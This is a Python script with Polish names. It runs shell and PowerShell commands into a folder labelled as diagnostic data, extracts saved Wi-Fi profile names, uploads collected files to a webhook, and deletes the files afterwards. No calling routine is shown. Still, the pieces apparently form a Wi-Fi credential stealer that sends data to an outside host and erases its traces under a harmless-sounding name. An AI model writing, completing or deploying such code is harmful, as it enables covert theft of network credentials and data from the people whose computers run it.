import os
import subprocess
import requests
SCIEZKA_DO_FOLDERU = "C:\\dane_diagnostyczne"

def execute_cmd(commands):
    process = subprocess.Popen(
        'cmd.exe',
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        shell=True
    )

    try:
        # Send commands to the process
        for command in commands:
            process.stdin.write(command + '\n')
            process.stdin.flush()

        # Close the input to signal we're done
        process.stdin.close()

        # Read the output in real-time
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                print(output.strip())

        # Read any remaining output
        stderr = process.communicate()[1]
        if stderr:
            print(stderr)

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        process.terminate()


def wyslij_plik_do_webhooka(webhook_url, folder_path, file_name):
    file_path = os.path.join(folder_path, file_name)
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            file_data = file.read()
            files = {'file': (file_name, file_data)}
            response = requests.post(webhook_url, files=files)

def czy_znaleziono_folder(sciezka):
    return os.path.exists(sciezka)

def lista_plikow_w_folderze(folder_path):
    if os.path.exists(folder_path):
        files = os.listdir(folder_path)
        return files
    else:
        print(f'Folder {folder_path} nie istnieje.')
def usun_pliki_z_diagnozy():
    if czy_znaleziono_folder(SCIEZKA_DO_FOLDERU):
        os.system("del /q C:\\dane_diagnostyczne\\*.txt")
        print("Pliki z diagnozy zostały usunięte.")
    else:
        print("Folder 'dane_diagnostyczne' nie został znaleziony lub nie ma w nim plików.")

file_path = "C:\\dane_diagnostyczne\\wifi.txt"

def extract_wifi_profiles(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    profiles = []
    capture = False

    for line in lines:
        line = line.strip()
        if line == "User profiles":
            capture = True
        elif capture and line.startswith("All User Profile"):
            profile_name = line.split(":")[1].strip()
            profiles.append(profile_name)

    return profiles


def uruchom_komende(komenda, nazwa_pliku):
    with open(nazwa_pliku, "w") as plik:
        subprocess.run(komenda, stdout=plik, stderr=subprocess.STDOUT, shell=True)


def run_powershell_command(command, output_file):
    powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    full_command = f'"{powershell_path}" -Command "{command}"'

    with open(output_file, "w") as output:
        subprocess.run(full_command, stdout=output, stderr=subprocess.STDOUT, shell=True)

